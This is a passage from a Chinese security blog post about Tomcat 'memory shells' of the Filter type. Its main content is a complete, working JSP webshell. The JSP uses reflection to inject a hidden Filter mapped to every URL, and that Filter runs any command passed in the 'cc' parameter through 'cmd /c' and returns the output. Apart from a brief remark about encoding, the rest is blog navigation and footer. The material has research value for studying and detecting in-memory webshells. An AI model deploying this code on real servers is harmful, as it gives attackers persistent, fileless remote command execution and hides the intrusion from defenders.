+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    //创建filter</span><br><span class="line">    Filter filter=new Filter() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">            HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">            if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class="line">                byte[] bytes = new byte[1024];</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class="line"></span><br><span class="line">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">                byte[] b = new byte[1024];</span><br><span class="line">                int a = -1;</span><br><span class="line"></span><br><span class="line">                while ((a = in.read(b)) != -1) &#123;</span><br><span class="line">                    baos.write(b, 0, a);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    //封装filter</span><br><span class="line">    String filtername=&quot;novic4&quot;;</span><br><span class="line">    FilterDef filterDef=new FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(filtername);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">    //将filterdef添加到filterdefs中</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    //将filterdef添加到filterconfig中</span><br><span class="line">    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(true);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">    //建立对应得filterMap</span><br><span class="line">    FilterMap filterMap = new FilterMap();</span><br><span class="line">    filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class="line">    filterMap.setFilterName(filtername);</span><br><span class="line">    //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">    //插入filterMaps，将其插到首位</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    //添加到filterconfigs</span><br><span class="line">    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">    Configs.setAccessible(true);</span><br><span class="line">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(filtername,filterConfig);</span><br><span class="line">    out.print(&quot;bingo&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>不过中文回显还是有点问题</p>
+
+                </div>
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                Tomcat内存马—Filter型
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2023/06/11/Tomcat内存马—Filter型/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">P1taya</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2023-06-11 23:42</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/06/14/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Listener%E5%9E%8B/"
+                                   title="Tomcat内存马—Listener型"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Tomcat内存马—Listener型</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2023/06/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94servlet%E5%9E%8B/"
+                                   title="Tomcat内存马—servlet型"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Tomcat内存马—servlet型</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter"><span class="nav-text">Filter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95demo"><span class="nav-text">测试demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Filter%E7%9B%B8%E5%85%B3%E7%B1%BB"><span class="nav-text">Filter相关类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat-Filter%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-text">Tomcat Filter调用流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filter%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-text">filter内存马注入</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2022</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">P1taya</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">79.9k</span>
+                </span>
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter"><span class="nav-text">Filter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95demo"><span class="nav-text">测试demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Filter%E7%9B%B8%E5%85%B3%E7%B1%BB"><span class="nav-text">Filter相关类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat-Filter%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-text">Tomcat Filter调用流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filter%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-text">filter内存马注入</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/toggle-theme.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/lazyload.js"></script>
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/copyright-info.js"></script>
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+    
+        
+    
+
+</body>
+</html>
